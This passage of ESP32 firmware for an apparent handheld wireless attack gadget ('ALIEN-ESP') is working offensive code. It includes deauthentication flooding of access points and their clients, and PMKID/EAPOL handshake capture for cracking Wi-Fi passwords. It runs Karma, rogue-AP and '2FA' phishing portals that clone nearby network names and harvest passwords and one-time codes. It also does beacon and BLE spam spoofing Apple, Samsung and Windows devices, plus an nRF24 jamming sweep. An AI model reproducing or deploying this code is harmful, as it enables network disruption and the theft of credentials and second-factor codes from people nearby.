  adv.addData((char*)payload, sizeof(payload));
  BLEAdvertising* a = BLEDevice::getAdvertising();
  a->setAdvertisementData(adv);
  BLEDevice::startAdvertising();
}

static uint8_t beacon_frame[128];
static uint8_t beacon_bssid[6];
static char beacon_ssid[33];
static uint8_t beacon_ssid_len = 0;

static void gen_beacon_ssid(uint32_t n) {
  const char* pref[] = {"H4CK-ED", "TP-LINK_", "JioFiber_", "Airtel_", "NETGEAR"};
  const char* p = pref[n % 5];
  beacon_ssid_len = snprintf(beacon_ssid, sizeof(beacon_ssid), "%s%04lu", p, (unsigned long)((n/5) % 10000));
}

static void gen_beacon_bssid(uint32_t n) {
  uint32_t h = n * 2654435761u;
  beacon_bssid[0] = (uint8_t)((h & 0xFE) | 0x02);
  beacon_bssid[1] = (uint8_t)((h >> 8) & 0xFF);
  beacon_bssid[2] = (uint8_t)((h >> 16) & 0xFF);
  beacon_bssid[3] = (uint8_t)((h >> 24) & 0xFF);
  beacon_bssid[4] = (uint8_t)((n * 0x9E3779B1u) & 0xFF);
  beacon_bssid[5] = (uint8_t)(((n >> 8) * 0x85EBCA77u) & 0xFF);
}

static uint16_t build_beacon(uint8_t ch) {
  static const uint8_t rates[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  uint16_t p = 0;
  beacon_frame[p++] = 0x80; beacon_frame[p++] = 0x00;
  beacon_frame[p++] = 0x00; beacon_frame[p++] = 0x00;
  for (int i = 0; i < 6; i++) beacon_frame[p++] = 0xFF;
  memcpy(beacon_frame+p, beacon_bssid, 6); p += 6;
  memcpy(beacon_frame+p, beacon_bssid, 6); p += 6;
  beacon_frame[p++] = 0x00; beacon_frame[p++] = 0x00;
  for (int i = 0; i < 8; i++) beacon_frame[p++] = 0x00;
  beacon_frame[p++] = 0x64; beacon_frame[p++] = 0x00;
  beacon_frame[p++] = 0x31; beacon_frame[p++] = 0x04;
  beacon_frame[p++] = 0x00; beacon_frame[p++] = beacon_ssid_len;
  memcpy(beacon_frame+p, beacon_ssid, beacon_ssid_len); p += beacon_ssid_len;
  beacon_frame[p++] = 0x01; beacon_frame[p++] = 0x08;
  for (int i = 0; i < 8; i++) beacon_frame[p++] = rates[i];
  beacon_frame[p++] = 0x03; beacon_frame[p++] = 0x01; beacon_frame[p++] = ch;
  return p;
}

static void enter_feature(Screen s) {
  scr = s;
  frame = 0;
  glow_mode = false;
  twofa_mode = false;

  const char* label = "";
  switch (s) {
    case SCR_AUTO:    label = "Auto Attack"; break;
    case SCR_PMKID:   label = "PMKID"; break;
    case SCR_DEAUTH:  label = "Deauth"; break;
    case SCR_TARGET_DEAUTH: label = "Targeted"; break;
    case SCR_KARMA:   label = "Karma Portal"; break;
    case SCR_ROGUE:   label = "Rogue AP"; break;
    case SCR_2FA:     label = "2FA Portal"; break;
    case SCR_BLESPAM: label = "BLE Spam"; break;
    case SCR_RFSWEEP: label = "RF Sweep"; break;
    case SCR_WSCAN:   label = "WiFi Scan"; break;
    case SCR_PROBE:   label = "Probe Sniff"; break;
    case SCR_PACKET:  label = "Packet Mon"; break;
    case SCR_BEACON:  label = "Beacon Spam"; break;
    case SCR_HIDDEN:  label = "Hidden SSID"; break;
    case SCR_CONGEST: label = "Congestion"; break;
    case SCR_INFO:    label = "Info"; break;
    case SCR_OTA:     label = "OTA Update"; break;
    default: break;
  }

  if (label[0]) {
    display.clearDisplay();
    draw_alien();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    const char* l = "Loading...";
    int lw = strlen(l) * 6;
    display.setCursor((128 - lw) / 2, 52);
    display.print(l);
    display.display();
    delay(50);
  }

  if (s == SCR_AUTO) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("_scan", "12345678");
    delay(150);
    scan_aps();
    int best = -1, best_rssi = -999;
    for (int i = 0; i < ap_count; i++)
      if (ap_db[i].wpa2 && ap_db[i].rssi > best_rssi) { best_rssi = ap_db[i].rssi; best = i; }
    if (best >= 0) {
      target_idx = best;
      memcpy(target_bssid, ap_db[best].bssid, 6);
      target_ch = ap_db[best].channel;
      strncpy(target_ssid, ap_db[best].ssid, 32);
    } else target_idx = -1;
    pmkid_hits = 0; eapol_hits = 0; deauth_sent = 0;
    esp_wifi_set_promiscuous_rx_cb(&pmkid_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = (target_idx >= 0) ? target_ch : 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis(); last_deauth_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_PMKID) {
    WiFi.mode(WIFI_AP_STA); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("_scan", "12345678"); delay(150);
    scan_aps();
    for (int i = 0; i < ap_count; i++)
      Serial.printf("[%d] %s ch%d %d\n", i, ap_db[i].ssid, ap_db[i].channel, ap_db[i].rssi);
    pmkid_hits = 0; eapol_hits = 0; deauth_sent = 0; target_idx = -1;
    esp_wifi_set_promiscuous_rx_cb(&pmkid_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis(); last_deauth_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_DEAUTH) {
    WiFi.mode(WIFI_AP_STA); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("_scan", "12345678"); delay(150);
    scan_aps();
    for (int i = 0; i < ap_count; i++)
      Serial.printf("[%d] %s ch%d %d\n", i, ap_db[i].ssid, ap_db[i].channel, ap_db[i].rssi);
    deauth_sent = 0; target_idx = -1;
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis(); last_deauth_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_TARGET_DEAUTH) {
    WiFi.mode(WIFI_AP_STA); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("_scan", "12345678"); delay(150);
    scan_aps();
    if (ap_count > 0) {
      target_idx = 0;
      memcpy(target_bssid, ap_db[0].bssid, 6);
      target_ch = ap_db[0].channel;
      strncpy(target_ssid, ap_db[0].ssid, 32);
    }
    client_count = 0;
    client_sel = 0;
    deauth_sent = 0;
    esp_wifi_set_promiscuous_rx_cb(&client_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
    glow_mode = true;
  }
  else if (s == SCR_KARMA) {
    WiFi.mode(WIFI_AP_STA); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("Free_WiFi", ""); delay(150);
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.on("/", handle_root);
    webServer.on("/login", HTTP_POST, handle_login);
    webServer.onNotFound(handle_notfound);
    webServer.begin();
    creds_captured = 0; karma_count = 0;
    memset(karma_pool, 0, sizeof(karma_pool));
    esp_wifi_set_promiscuous_rx_cb(&karma_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_ROGUE) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    int n = WiFi.scanNetworks();
    int best = -1, best_rssi = -999;
    for (int i = 0; i < n; i++)
      if (WiFi.RSSI(i) > best_rssi && WiFi.SSID(i).length() > 0) { best_rssi = WiFi.RSSI(i); best = i; }
    if (best >= 0) strncpy(rogue_ssid, WiFi.SSID(best).c_str(), 32);
    else strcpy(rogue_ssid, "Free_WiFi");
    rogue_ssid[32] = 0;
    WiFi.scanDelete();
    delay(100);
    WiFi.mode(WIFI_AP); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP(rogue_ssid, ""); delay(200);
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.on("/", handle_root);
    webServer.on("/login", HTTP_POST, handle_login);
    webServer.onNotFound(handle_notfound);
    webServer.begin();
    creds_captured = 0; otp_captured = 0;
    glow_mode = true;
  }
  else if (s == SCR_2FA) {
    twofa_mode = true;
    WiFi.mode(WIFI_AP); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("Free_WiFi", ""); delay(200);
    dnsServer.start(53, "*", WiFi.softAPIP());
    webServer.on("/", handle_root);
    webServer.on("/login", HTTP_POST, handle_login);
    webServer.on("/verify", HTTP_POST, handle_verify);
    webServer.onNotFound(handle_notfound);
    webServer.begin();
    creds_captured = 0; otp_captured = 0;
    last_user[0] = last_pass[0] = last_otp[0] = 0;
    glow_mode = true;
  }
  else if (s == SCR_BLESPAM) {
    WiFi.mode(WIFI_OFF); delay(50);
    if (!ble_inited) { BLEDevice::init("AirPods"); ble_inited = true; }
    ble_spam_count = 0;
    glow_mode = true;
  }
  else if (s == SCR_RFSWEEP) {
    WiFi.mode(WIFI_OFF); delay(50);
    check_nrf();
    nrf_jam_count = 0;
    glow_mode = true;
  }
  else if (s == SCR_WSCAN) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    last_scan_ms = 0;
  }
  else if (s == SCR_PROBE) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    probe_count = 0;
    memset(probe_pool, 0, sizeof(probe_pool));
    probe_last[0] = 0;
    esp_wifi_set_promiscuous_rx_cb(&probe_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_PACKET) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    packet_count = 0;
    memset(congestion, 0, sizeof(congestion));
    esp_wifi_set_promiscuous_rx_cb(&packet_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_BEACON) {
    WiFi.mode(WIFI_AP); WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAP("_beacon", "12345678"); delay(150);
    esp_wifi_set_promiscuous(false);
    beacon_count = 0;
    glow_mode = true;
  }
  else if (s == SCR_HIDDEN) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    hidden_count = 0;
    memset(hidden_ssids, 0, sizeof(hidden_ssids));
    esp_wifi_set_promiscuous_rx_cb(&hidden_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_CONGEST) {
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
    memset(congestion, 0, sizeof(congestion));
    esp_wifi_set_promiscuous_rx_cb(&packet_cb);
    esp_wifi_set_promiscuous(true);
    current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
    glow_mode = true;
  }
  else if (s == SCR_OTA) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ALIEN-OTA", "12345678");
    delay(200);
    otaServer.on("/", HTTP_GET, ota_handle_root);
    otaServer.on("/ota", HTTP_POST, ota_handle_done, ota_handle_upload);
    otaServer.onNotFound(ota_handle_root);
    otaServer.begin();
    Serial.printf("ota ready %s\n", WiFi.softAPIP().toString().c_str());
  }
}

static void exit_feature() {
  glow_mode = false;
  twofa_mode = false;
  if (scr == SCR_OTA) {
    otaServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(30);
    scr = SCR_MENU;
    return;
  }
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true, false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(30);
  scr = SCR_MENU;
}

static void loop_auto() {
  if (target_idx >= 0 && millis() - last_deauth_ms > 1000) {
    send_deauth_bcast(target_bssid);
    last_deauth_ms = millis();
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "AUTO K:%lu E:%lu", (unsigned long)pmkid_hits, (unsigned long)eapol_hits);
  if (target_idx >= 0) snprintf(l2, sizeof(l2), "%.10s DA:%lu", target_ssid, (unsigned long)(deauth_sent / 1000));
  else snprintf(l2, sizeof(l2), "no target");
  draw_status(l1, l2);
  display.display();
}

static void loop_pmkid() {
  if (millis() - last_hop_ms > 400) {
    if (++current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
  }
  if (target_idx >= 0 && millis() - last_deauth_ms > 1500) {
    send_deauth_bcast(target_bssid);
    last_deauth_ms = millis();
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  if (target_idx >= 0) {
    snprintf(l1, sizeof(l1), "P:%lu E:%lu DA:%lu", (unsigned long)pmkid_hits, (unsigned long)eapol_hits, (unsigned long)(deauth_sent / 1000));
    snprintf(l2, sizeof(l2), "%.10s ch%d", target_ssid, target_ch);
  } else {
    snprintf(l1, sizeof(l1), "P:%lu E:%lu APs:%d", (unsigned long)pmkid_hits, (unsigned long)eapol_hits, ap_count);
    snprintf(l2, sizeof(l2), "ch%d tap=next", current_ch);
  }
  draw_status(l1, l2);
  display.display();
}

static void loop_deauth() {
  if (target_idx >= 0) {
    esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 20; i++) send_deauth_bcast(target_bssid);
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  if (target_idx >= 0) {
    snprintf(l1, sizeof(l1), "DEAUTH %lu pk", (unsigned long)deauth_sent);
    snprintf(l2, sizeof(l2), "%.11s ch%d", target_ssid, target_ch);
  } else {
    snprintf(l1, sizeof(l1), "DEAUTH: pick AP");
    snprintf(l2, sizeof(l2), "APs:%d tap=next", ap_count);
  }
  draw_status(l1, l2);
  display.display();
}

static void loop_target_deauth() {
  esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
  if (client_count > 0) {
    uint8_t* m = client_db[client_sel].mac;
    for (int i = 0; i < 20; i++) {
      send_deauth_to(m, target_bssid, target_bssid);
      send_deauth_to(target_bssid, m, target_bssid);
    }
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Target %lu pk", (unsigned long)deauth_sent);
  if (client_count > 0) {
    uint8_t* m = client_db[client_sel].mac;
    snprintf(l2, sizeof(l2), "%02X:%02X:%02X %d/%d", m[3], m[4], m[5], client_sel + 1, client_count);
  } else {
    snprintf(l2, sizeof(l2), "no clients found");
  }
  draw_status(l1, l2);
  display.display();
}

static void loop_karma() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  portal_clients = WiFi.softAPgetStationNum();
  if (portal_clients == 0 && millis() - last_hop_ms > 300) {
    if (++current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Karma C:%lu S:%lu", (unsigned long)creds_captured, (unsigned long)stored_creds);
  snprintf(l2, sizeof(l2), "probe:%d cli:%lu", karma_count, (unsigned long)portal_clients);
  draw_status(l1, l2);
  display.display();
}

static void loop_rogue() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  portal_clients = WiFi.softAPgetStationNum();
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Rogue:%.12s", rogue_ssid);
  snprintf(l2, sizeof(l2), "C:%lu cli:%lu", (unsigned long)creds_captured, (unsigned long)portal_clients);
  draw_status(l1, l2);
  display.display();
}

static void loop_2fa() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  portal_clients = WiFi.softAPgetStationNum();
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "2FA pass:%lu", (unsigned long)creds_captured);
  snprintf(l2, sizeof(l2), "otp:%lu cli:%lu", (unsigned long)otp_captured, (unsigned long)portal_clients);
  draw_status(l1, l2);
  display.display();
}

static void loop_ble_spam() {
  uint8_t mode = (frame / 2) % 3;
  if (mode == 0)      send_apple();
  else if (mode == 1) send_samsung();
  else                send_windows();
  ble_spam_count++;
  display.clearDisplay();
  draw_alien_auto();
  draw_ble_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "BLE spam: %lu", (unsigned long)ble_spam_count);
  const char* t = (mode == 0) ? "apple" : (mode == 1) ? "samsung" : "windows";
  snprintf(l2, sizeof(l2), "%s", t);
  draw_status(l1, l2);
  display.display();
}

static void loop_rf_sweep() {
  if (nrf_ready) nrf_sweep_burst();
  display.clearDisplay();
  draw_alien_auto();
  draw_ble_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "RF Sweep");
  if (nrf_ready) {
    snprintf(l2, sizeof(l2), "sweeps:%lu", (unsigned long)nrf_jam_count);
  } else {
    snprintf(l2, sizeof(l2), "nRF24 offline");
  }
  draw_status(l1, l2);
  display.display();
}

static void loop_wscan() {
  if (millis() - last_scan_ms > 5000 || last_scan_ms == 0) {
    display.clearDisplay();
    draw_alien();
    draw_wifi_theme();
    draw_status("Scanning...", "");
    display.display();
    int n = WiFi.scanNetworks();
    scan_ap_count = n < 8 ? n : 8;
    for (int i = 0; i < scan_ap_count; i++) {
      strncpy(scan_ssids[i], WiFi.SSID(i).c_str(), 32);
      scan_ssids[i][32] = 0;
      scan_rssi[i] = WiFi.RSSI(i);
      scan_ch[i] = WiFi.channel(i);
    }
    WiFi.scanDelete();
    last_scan_ms = millis();
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.printf("WiFi: %d APs", scan_ap_count);
  display.drawFastHLine(0, 10, 128, SSD1306_WHITE);
  for (int i = 0; i < scan_ap_count && i < 5; i++) {
    display.setCursor(0, 12 + i * 10);
    char buf[22];
    snprintf(buf, sizeof(buf), "%.13s %d", scan_ssids[i], scan_rssi[i]);
    display.print(buf);
  }
  display.display();
}

static void loop_probe() {
  if (millis() - last_hop_ms > 250) {
    if (++current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Probes: %d", probe_count);
  if (probe_last[0]) snprintf(l2, sizeof(l2), "%.18s", probe_last);
  else snprintf(l2, sizeof(l2), "listening...");
  draw_status(l1, l2);
  display.display();
}

static void loop_packet() {
  if (millis() - last_hop_ms > 200) {
    if (++current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Packets: %lu", (unsigned long)packet_count);
  snprintf(l2, sizeof(l2), "ch%d", current_ch);
  draw_status(l1, l2);
  display.display();
}

static void loop_beacon() {
  for (int i = 0; i < 20; i++) {
    gen_beacon_ssid(beacon_idx);
    gen_beacon_bssid(beacon_idx);
    uint8_t ch = (beacon_idx % 13) + 1;
    uint16_t len = build_beacon(ch);
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, len, false);
    beacon_count++;
    beacon_idx++;
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Beacons: %lu", (unsigned long)beacon_count);
  snprintf(l2, sizeof(l2), "ch cycling");
  draw_status(l1, l2);
  display.display();
}

static void loop_hidden() {
  if (millis() - last_hop_ms > 200) {
    if (++current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
  }
  display.clearDisplay();
  draw_alien_auto();
  draw_wifi_theme();
  char l1[32], l2[32];
  snprintf(l1, sizeof(l1), "Hidden: %d", hidden_count);
  if (hidden_count > 0) snprintf(l2, sizeof(l2), "%.18s", hidden_ssids[hidden_count-1]);
  else snprintf(l2, sizeof(l2), "waiting...");
  draw_status(l1, l2);
  display.display();
}

static void loop_congest() {
  if (millis() - last_hop_ms > 150) {
    if (++current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop_ms = millis();
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  display.setCursor(0, 0);
  display.print("Congestion");
  char chbuf[8];
  snprintf(chbuf, sizeof(chbuf), "CH:%d", current_ch);
  display.setCursor(128 - strlen(chbuf) * 6, 0);
  display.print(chbuf);
  display.drawFastHLine(0, 10, 128, SSD1306_WHITE);

  uint8_t mx = 1;
  for (int i = 0; i < 13; i++) if (congestion[i] > mx) mx = congestion[i];

  for (int i = 0; i < 13; i++) {
    int x = 5 + i * 9;
    int h = (int)((uint32_t)congestion[i] * 32 / mx);
    if (h > 32) h = 32;
    display.fillRect(x, 45 - h, 6, h, SSD1306_WHITE);
    if (i == current_ch - 1) {
      display.drawRect(x - 1, 13, 8, 33, SSD1306_WHITE);
    }
    display.drawPixel(x + 2, 48, SSD1306_WHITE);
    display.drawPixel(x + 3, 48, SSD1306_WHITE);
  }

  const int refs[] = {1, 5, 9, 13};
  for (int r = 0; r < 4; r++) {
    int n = refs[r];
    int bar_x = 5 + (n - 1) * 9;
    int bar_center = bar_x + 3;
    char buf[4];
    snprintf(buf, sizeof(buf), "%d", n);
    int tw = strlen(buf) * 6;
    display.setCursor(bar_center - tw / 2, 55);
    display.print(buf);
  }

  display.display();
}

static void loop_info() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  display.setCursor(0, 0);
  display.print("ALIEN-ESP");
  display.setCursor(128 - 6 * 5, 0);
  display.print(VERSION);
  display.drawFastHLine(0, 10, 128, SSD1306_WHITE);

  display.setCursor(0, 14);
  display.printf("RAM %luK  Min %luK",
                 (unsigned long)(ESP.getFreeHeap() / 1024),
                 (unsigned long)(heap_min / 1024));

  display.setCursor(0, 27);
  uint32_t up_s = millis() / 1000;
  uint32_t m = (up_s / 60) % 60, h = up_s / 3600;
  if (h > 0) display.printf("Up %luh %lum", (unsigned long)h, (unsigned long)m);
  else       display.printf("Up %lum %lus", (unsigned long)m, (unsigned long)(up_s % 60));

  display.setCursor(0, 40);
  display.printf("Saved C:%lu P:%lu E:%lu",
                 (unsigned long)stored_creds,
                 (unsigned long)stored_pmkid,
                 (unsigned long)stored_eapol);

  display.setCursor(0, 53);
  display.printf("Chip %dC   nRF:%s", (int)temp_avg, nrf_ready ? "OK" : "--");

  display.display();
}

static void loop_ota() {
  otaServer.handleClient();
  display.clearDisplay();
  draw_alien();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  const char* l1 = "ALIEN-OTA  12345678";
  display.setCursor((128 - strlen(l1) * 6) / 2, 47);
  display.print(l1);

  const char* l2 = "192.168.4.1";
  display.setCursor((128 - strlen(l2) * 6) / 2, 56);
  display.print(l2);

  display.display();
}

static void cycle_target() {
  if (ap_count > 0) {
    target_idx = (target_idx + 1) % ap_count;
    memcpy(target_bssid, ap_db[target_idx].bssid, 6);
    target_ch = ap_db[target_idx].channel;
    strncpy(target_ssid, ap_db[target_idx].ssid, 32);
    target_ssid[32] = 0;
    esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[target] %s ch%d\n", target_ssid, target_ch);
  }
}

static void on_short_press() {
  if (scr == SCR_MENU) menu_sel = (menu_sel + 1) % MENU_COUNT;
  else if (scr == SCR_PMKID || scr == SCR_DEAUTH || scr == SCR_AUTO) cycle_target();
  else if (scr == SCR_TARGET_DEAUTH && client_count > 0) {
    client_sel = (client_sel + 1) % client_count;
  }
}

static void on_long_press() {
  if (scr == SCR_MENU) {
    switch (menu_sel) {
      case 0:  enter_feature(SCR_AUTO); break;
      case 1:  enter_feature(SCR_PMKID); break;
      case 2:  enter_feature(SCR_DEAUTH); break;
      case 3:  enter_feature(SCR_TARGET_DEAUTH); break;
      case 4:  enter_feature(SCR_KARMA); break;
      case 5:  enter_feature(SCR_ROGUE); break;
      case 6:  enter_feature(SCR_2FA); break;
      case 7:  enter_feature(SCR_BLESPAM); break;
      case 8:  enter_feature(SCR_RFSWEEP); break;
      case 9:  enter_feature(SCR_WSCAN); break;
      case 10: enter_feature(SCR_PROBE); break;
      case 11: enter_feature(SCR_PACKET); break;
      case 12: enter_feature(SCR_BEACON); break;
      case 13: enter_feature(SCR_HIDDEN); break;
      case 14: enter_feature(SCR_CONGEST); break;
      case 15: enter_feature(SCR_INFO); break;
      case 16: enter_feature(SCR_OTA); break;
      case 17: display.clearDisplay(); display.display(); scr = SCR_OFF; break;
    }
  } else if (scr != SCR_BOOT) {
    exit_feature();
  }
}

static void handle_button() {
  bool cur = digitalRead(BTN_PIN);
  if (cur == LOW && btn_last == HIGH) {
    btn_down_ms = millis();
    btn_long_fired = false;
  }
  if (cur == LOW && !btn_long_fired && (millis() - btn_down_ms >= 600)) {
    btn_long_fired = true;
    on_long_press();
  }
  if (cur == HIGH && btn_last == LOW) {
    if (!btn_long_fired) on_short_press();
  }
  btn_last = cur;
}

static void step_anim() {
  frame++;
  if (!blinking) {
    if (next_blink == 0) { blinking = true; blink_timer = 3; }
    else next_blink--;
  } else {
    if (--blink_timer <= 0) { blinking = false; next_blink = 120 + (frame % 180); }
  }
  uint32_t h = ESP.getFreeHeap();
  if (h < heap_min) heap_min = h;

  static uint32_t last_temp_ms = 0;
  if (millis() - last_temp_ms > 500) {
    float t = read_temp();
    if (temp_avg == 0) temp_avg = t;
    temp_avg = temp_avg * 0.85f + t * 0.15f;
    last_temp_ms = millis();
  }
}

static void render_boot(int step) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (step < 4) {
    int density = 220 - (step * 60);
    if (density < 0) density = 0;
    for (int i = 0; i < density; i++) {
      display.drawPixel(random(0, 128), random(0, 64), SSD1306_WHITE);
    }
  } else {
    draw_alien();
    display.setCursor(37, 50);
    display.print("ALIEN ESP");
  }
  display.display();
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\nALIEN-ESP v2.7.10");
  pinMode(BTN_PIN, INPUT_PULLUP);
  Wire.begin(SDA_PIN, SCL_PIN);
  Wire.setClock(100000);
  delay(200);
  if (display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) Serial.println("oled 3c");
  else if (display.begin(SSD1306_SWITCHCAPVCC, 0x3D)) Serial.println("oled 3d");
  else Serial.println("oled fail");
  display.clearDisplay();
  display.display();
  randomSeed(micros());
  heap_min = ESP.getFreeHeap();
  spiffs_init();
  spiffs_refresh();
  for (int i = 0; i < 14; i++) { render_boot(i); delay(90); }
  delay(200);
  scr = SCR_MENU;
}

void loop() {
  handle_button();
  if (scr == SCR_OFF) { delay(80); return; }
  step_anim();
  switch (scr) {
    case SCR_MENU:          draw_menu(); break;
    case SCR_AUTO:          loop_auto(); break;
    case SCR_PMKID:         loop_pmkid(); break;
    case SCR_DEAUTH:        loop_deauth(); break;
    case SCR_TARGET_DEAUTH: loop_target_deauth(); break;
    case SCR_KARMA:         loop_karma(); break;
    case SCR_ROGUE:         loop_rogue(); break;
    case SCR_2FA:           loop_2fa(); break;
    case SCR_BLESPAM:       loop_ble_spam(); break;
    case SCR_RFSWEEP:       loop_rf_sweep(); break;
    case SCR_WSCAN:         loop_wscan(); break;
    case SCR_PROBE:         loop_probe(); break;
    case SCR_PACKET:        loop_packet(); break;
    case SCR_BEACON:        loop_beacon(); break;
    case SCR_HIDDEN:        loop_hidden(); break;
    case SCR_CONGEST:       loop_congest(); break;
    case SCR_INFO:          loop_info(); break;
    case SCR_OTA:           loop_ota(); break;
  }
  delay(30);
}
